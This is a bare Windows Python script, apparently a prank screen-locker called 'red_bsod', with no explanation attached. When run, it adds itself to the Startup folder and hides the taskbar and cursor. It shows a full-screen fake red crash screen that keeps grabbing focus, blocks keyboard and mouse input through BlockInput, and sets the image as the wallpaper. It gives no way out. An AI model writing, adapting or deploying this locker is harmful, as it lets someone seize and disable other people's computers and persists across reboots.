import ctypes
import os
import sys
import tkinter as tk
from ctypes import wintypes

import PIL.Image, PIL.ImageTk
import win32com.client


def resource_path(rel):
    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base, rel)


def change_wallpaper(image_path):
    image_path = os.path.abspath(image_path)
    user32 = ctypes.windll.user32
    user32.SystemParametersInfoW.argtypes = [wintypes.UINT, wintypes.UINT, wintypes.LPCWSTR, wintypes.UINT]
    user32.SystemParametersInfoW(20, 0, image_path, 3)


def add_to_startup():
    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    link_path = os.path.join(startup_path, "red_bsod.lnk")
    if not os.path.exists(link_path):
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(link_path)
        shortcut.Targetpath = sys.executable
        if getattr(sys, "frozen", False):
            shortcut.Arguments = ""
        else:
            shortcut.Arguments = '"%s"' % os.path.abspath(__file__)
        shortcut.WorkingDirectory = os.path.dirname(os.path.abspath(__file__))
        shortcut.Save()


def hide_taskbar():
    user32 = ctypes.windll.user32
    user32.FindWindowW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR]
    user32.FindWindowW.restype = wintypes.HWND
    taskbar_hwnd = user32.FindWindowW("Shell_TrayWnd", None)
    if taskbar_hwnd:
        user32.ShowWindow.argtypes = [wintypes.HWND, wintypes.INT]
        user32.ShowWindow(taskbar_hwnd, 0)


def hide_cursor():
    while ctypes.windll.user32.ShowCursor(False) >= 0:
        pass


add_to_startup()
hide_taskbar()
hide_cursor()

root = tk.Tk()
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
image = PIL.Image.open(resource_path("red_bsod.png"))
image = image.resize((width, height), PIL.Image.Resampling.LANCZOS)
background = PIL.ImageTk.PhotoImage(image)
label = tk.Label(root, image=background)
label.pack(fill="both", expand=True)
root.attributes("-fullscreen", True)


def keep_window_focused():
    root.focus_force()
    root.after(100, keep_window_focused)


root.configure(background="black")
try:
    ctypes.windll.user32.BlockInput(True)
except OSError:
    pass
change_wallpaper(resource_path("red_bsod.png"))
keep_window_focused()
root.mainloop()